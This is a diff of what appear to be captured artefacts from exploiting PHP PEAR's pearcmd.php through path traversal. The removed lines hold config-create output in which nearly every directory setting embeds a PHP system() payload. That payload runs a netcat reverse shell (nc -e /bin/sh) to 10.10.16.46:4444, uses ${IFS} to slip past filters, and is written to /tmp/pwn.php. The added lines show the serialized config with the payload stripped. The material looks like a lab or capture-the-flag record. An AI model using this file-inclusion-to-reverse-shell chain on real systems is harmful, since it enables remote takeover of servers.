@@ -1,49 +1,5 @@
-CONFIGURATION (CHANNEL PEAR.PHP.NET):
-=====================================
-Auto-discover new Channels     auto_discover    <not set>
-Default Channel                default_channel  pear.php.net
-HTTP Proxy Server Address      http_proxy       <not set>
-PEAR server [DEPRECATED]       master_server    <not set>
-Default Channel Mirror         preferred_mirror <not set>
-Remote Configuration File      remote_config    <not set>
-PEAR executables directory     bin_dir          /&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&<?=system("nc${IFS}-e${IFS}/bin/sh${IFS}10.10.16.46${IFS}4444")?>/pear
-PEAR documentation directory   doc_dir          /&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&<?=system("nc${IFS}-e${IFS}/bin/sh${IFS}10.10.16.46${IFS}4444")?>/pear/docs
-PHP extension directory        ext_dir          /&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&<?=system("nc${IFS}-e${IFS}/bin/sh${IFS}10.10.16.46${IFS}4444")?>/pear/ext
-PEAR directory                 php_dir          /&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&<?=system("nc${IFS}-e${IFS}/bin/sh${IFS}10.10.16.46${IFS}4444")?>/pear/php
-PEAR Installer cache directory cache_dir        /&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&<?=system("nc${IFS}-e${IFS}/bin/sh${IFS}10.10.16.46${IFS}4444")?>/pear/cache
-PEAR configuration file        cfg_dir          /&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&<?=system("nc${IFS}-e${IFS}/bin/sh${IFS}10.10.16.46${IFS}4444")?>/pear/cfg
-directory
-PEAR data directory            data_dir         /&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&<?=system("nc${IFS}-e${IFS}/bin/sh${IFS}10.10.16.46${IFS}4444")?>/pear/data
-PEAR Installer download        download_dir     /&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&<?=system("nc${IFS}-e${IFS}/bin/sh${IFS}10.10.16.46${IFS}4444")?>/pear/download
-directory
-Systems manpage files          man_dir          /&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&<?=system("nc${IFS}-e${IFS}/bin/sh${IFS}10.10.16.46${IFS}4444")?>/pear/man
-directory
-PEAR metadata directory        metadata_dir     <not set>
-PHP CLI/CGI binary             php_bin          <not set>
-php.ini location               php_ini          <not set>
---program-prefix passed to     php_prefix       <not set>
-PHP's ./configure
---program-suffix passed to     php_suffix       <not set>
-PHP's ./configure
-PEAR Installer temp directory  temp_dir         /&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&<?=system("nc${IFS}-e${IFS}/bin/sh${IFS}10.10.16.46${IFS}4444")?>/pear/temp
-PEAR test directory            test_dir         /&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&<?=system("nc${IFS}-e${IFS}/bin/sh${IFS}10.10.16.46${IFS}4444")?>/pear/tests
-PEAR www files directory       www_dir          /&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&<?=system("nc${IFS}-e${IFS}/bin/sh${IFS}10.10.16.46${IFS}4444")?>/pear/www
-Cache TimeToLive               cache_ttl        <not set>
-Preferred Package State        preferred_state  <not set>
-Unix file mask                 umask            <not set>
-Debug Log Level                verbose          <not set>
-PEAR password (for             password         <not set>
-maintainers)
-Signature Handling Program     sig_bin          <not set>
-Signature Key Directory        sig_keydir       <not set>
-Signature Key Id               sig_keyid        <not set>
-Package Signature Type         sig_type         <not set>
-PEAR username (for             username         <not set>
-maintainers)
-User Configuration File        Filename         /tmp/pwn.php
-System Configuration File      Filename         #no#system#config#
-Successfully created default configuration file "/tmp/pwn.php"
-<!DOCTYPE html>
+#PEAR_Config 0.9
+a:13:{s:7:"php_dir";s:146:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/pear/php";s:8:"data_dir";s:147:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/pear/data";s:7:"www_dir";s:146:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/pear/www";s:7:"cfg_dir";s:146:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/pear/cfg";s:7:"ext_dir";s:146:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/pear/ext";s:7:"doc_dir";s:147:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/pear/docs";s:8:"test_dir";s:148:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/pear/tests";s:9:"cache_dir";s:148:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/pear/cache";s:12:"download_dir";s:151:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/pear/download";s:8:"temp_dir";s:147:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/pear/temp";s:7:"bin_dir";s:142:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/pear";s:7:"man_dir";s:146:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/pear/man";s:10:"__channels";a:2:{s:12:"pecl.php.net";a:0:{}s:5:"__uri";a:0:{}}}<!DOCTYPE html>
 <html lang="en">
     <head>
         <meta charset="utf-8">
